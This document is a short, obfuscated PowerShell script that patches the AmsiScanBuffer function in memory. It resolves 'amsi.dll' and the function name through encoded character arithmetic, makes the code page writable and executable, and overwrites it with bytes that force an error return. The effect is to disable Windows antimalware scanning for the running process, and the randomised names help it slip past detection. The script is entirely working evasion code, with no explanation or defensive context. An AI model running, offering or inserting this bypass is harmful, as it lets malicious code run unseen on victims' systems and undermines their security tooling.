$OTct_W0iNJkQa = @"
using System;
using System.Runtime.InteropServices;
public class OTct_W0iNJkQa {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr N9jmBJ, string A1dAbCKTsjl);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr wZc0_g, UIntPtr d_tWESacAu9oOdg, uint wqvn, out uint cSeLX);
}
"@

Add-Type $OTct_W0iNJkQa

$fxAhl1C = [OTct_W0iNJkQa]::LoadLibrary("$([cHAR]([byte]0x61)+[chaR]([bYtE]0x6d)+[ChAr](115+89-89)+[CHar](16+89)+[CHAr](46)+[char]([BYte]0x64)+[chaR](108+30-30)+[ChAr](55+53))")
$l4ZqLPhhoq = [OTct_W0iNJkQa]::GetProcAddress($fxAhl1C, "$(('ÀmsîSc'+'ãnBùff'+'èr').NOrMALiZE([ChAr](70*45/45)+[cHAr](111+5-5)+[cHaR]([BYTe]0x72)+[ChaR](109*86/86)+[Char](68+20-20)) -replace [chAR](92)+[cHAr](38+74)+[cHAr]([ByTe]0x7b)+[Char](77)+[CHar](110)+[CHaR]([bYtE]0x7d))")
$p = 0
[OTct_W0iNJkQa]::VirtualProtect($l4ZqLPhhoq, [uint32]5, 0x40, [ref]$p)
$Kcz9jubNy = "0xB8"
$lr32FKIYA9HNtGWvg = "0x57"
$ztb = "0x00"
$N2seQUuIYzc7fM = "0x07"
$wE6 = "0x80"
$GzsRCPhgjHJ8 = "0xC3"
$uBlAvKRN86Ly = [Byte[]] ($Kcz9jubNy,$lr32FKIYA9HNtGWvg,$ztb,$N2seQUuIYzc7fM,+$wE6,+$GzsRCPhgjHJ8)
[System.Runtime.InteropServices.Marshal]::Copy($uBlAvKRN86Ly, 0, $l4ZqLPhhoq, 6)